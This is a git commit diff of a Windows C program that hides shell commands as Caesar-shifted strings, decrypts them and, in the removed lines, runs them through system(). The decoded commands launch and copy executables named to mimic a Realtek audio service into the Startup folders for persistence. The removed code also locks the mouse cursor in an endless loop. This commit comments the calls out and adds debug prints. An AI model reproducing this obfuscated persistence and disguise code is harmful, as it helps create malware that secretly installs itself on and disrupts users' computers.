618886b9f97f617a9d8f96b2f28be28efd811f64
Helheimiss_Windows11 <you@example.com>
2024-11-19 20:57:14 +0300

    update

--- main.c
+++ main.c
@@ -16,35 +16,50 @@ void decrypt(char *text, int shift)
 
 int main()
 {    
-    char path[MAX_PATH];
-    GetModuleFileName(NULL, path, sizeof(path));
-    printf("Полный путь к программе: %s\n", path);
-
     char text_1[] = "uvctv\"TvmCwfWUgtxkegWrf860gzg";
-    char text_2[] = "$TvmCwfWUgtxkeg860gzg$\"$E<^RtqitcoFcvc^Oketquqhv^Ykpfqyu^Uvctv\"Ogpw^Rtqitcou^Uvctvwr^$\"1[";
+    char text_2[] = "zeqr{\"$TvmCwfWUgtxkeg860gzg$\"$E<^RtqitcoFcvc^Oketquqhv^Ykpfqyu^Uvctv\"Ogpw^Rtqitcou^Uvctvwr^$\"1[";
     char text_3[] = "zeqr{\"$TvmCwfWUgtxkeg860gzg$\"$'CRRFCVC'^Oketquqhv^Ykpfqyu^Uvctv\"Ogpw^Rtqitcou^Uvctvwr^$\"1[";
     char text_4[] = "zeqr{\"$TvmCwfWUgtxkegWrf860gzg$\"$E<^RtqitcoFcvc^Oketquqhv^Ykpfqyu^Uvctv\"Ogpw^Rtqitcou^Uvctvwr^$\"1[";
     char text_5[] = "zeqr{\"$TvmCwfWUgtxkegWrf860gzg$\"$'CRRFCVC'^Oketquqhv^Ykpfqyu^Uvctv\"Ogpw^Rtqitcou^Uvctvwr^$\"1[";
 
+    printf("\n%s", text_1);
+    printf("\n%s", text_2);
+    printf("\n%s", text_3);
+    printf("\n%s", text_4);
+    printf("\n%s", text_5);
+
     decrypt(text_1, 2);
     decrypt(text_2, 2);
     decrypt(text_3, 2);
-
-    system(text_1);
-    //1 start RtkAudUServiceUpd64.exe
+    decrypt(text_4, 2);
+    decrypt(text_5, 2);
     
-    system(text_2);
-    //2 xcopy "RtkAudUService64.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
-    //3 xcopy "RtkAudUService64.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
-    system(text_3);
-    //4 xcopy "RtkAudUServiceUpd64.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
-    //5 xcopy "RtkAudUServiceUpd64.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
+    printf("\n\n");
+
+    printf("\n%s", text_1);
+    printf("\n%s", text_2);
+    printf("\n%s", text_3);
+    printf("\n%s", text_4);
+    printf("\n%s", text_5);
+
+    // system(text_1);
+    // //1 start RtkAudUServiceUpd64.exe
+    
+    // system(text_2);
+    // //2 xcopy "RtkAudUService64.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
+    // system(text_3);
+    // //3 xcopy "RtkAudUService64.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
+
+    // system(text_4);
+    // //4 xcopy "RtkAudUServiceUpd64.exe" "C:\ProgramData\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
+    // system(text_5);
+    // //5 xcopy "RtkAudUServiceUpd64.exe" "%APPDATA%\Microsoft\Windows\Start Menu\Programs\Startup\" /Y
     
 
-    while (1)
-    {
-        SetCursorPos(2000, 2000);
-    }
+    // while (1)
+    // {
+    //     SetCursorPos(2000, 2000);
+    // }
     
     
 	return 0;
